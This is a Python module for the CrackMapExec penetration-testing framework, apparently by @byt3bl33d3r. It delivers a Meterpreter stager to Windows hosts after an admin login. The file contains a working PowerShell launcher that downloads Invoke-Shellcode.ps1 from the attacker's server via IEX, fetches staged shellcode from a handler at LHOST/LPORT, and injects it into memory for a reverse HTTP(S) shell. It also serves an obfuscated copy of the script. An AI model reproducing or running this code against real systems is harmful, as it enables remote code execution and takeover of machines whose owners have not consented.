from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script
from sys import exit

class CMEModule:
    '''
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'met_inject'

    description = "Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"

    chain_support = False

    def options(self, context, module_options):
        '''
            LHOST    IP hosting the handler
            LPORT    Handler port
            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
            PROCID   Process ID to inject into (default: current powershell process)
        '''

        if not 'LHOST' in module_options or not 'LPORT' in module_options:
            context.log.error('LHOST and LPORT options are required!')
            exit(1)

        self.met_payload = 'reverse_https'
        self.lhost = None
        self.lport = None
        self.procid = None

        if 'PAYLOAD' in module_options:
            self.met_payload = module_options['PAYLOAD']

        if 'PROCID' in module_options:
            self.procid = module_options['PROCID']

        self.lhost = module_options['LHOST']
        self.lport = module_options['LPORT']

    def launcher(self, context, command):

        #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
        #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode

        launcher = """
        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1')
        $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
        $SumTest = $False
        while ($SumTest -eq $False)
        {{
            $GeneratedUri = $CharArray | Get-Random -Count 4
            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
        }}
        $RequestUri = -join $GeneratedUri
        $Request = "{}://{}:{}/$($RequestUri)"
        $WebClient = New-Object System.Net.WebClient
        [Byte[]]$bytes = $WebClient.DownloadData($Request)
        Invoke-Shellcode -Force -Shellcode $bytes""".format(context.server,
                                                     context.localip,
                                                     context.server_port,
                                                     'http' if self.met_payload == 'reverse_http' else 'https',
                                                     self.lhost,
                                                     self.lport)

        if self.procid:
            launcher += " -ProcessID {}".format(self.procid)

        return create_ps_command(launcher, force_ps32=True)

    def payload(self, context, command):
        with open(get_ps_script('PowerSploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as ps_script:
            return obfs_ps_script(ps_script.read())

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request, launcher, payload):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(payload)

            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()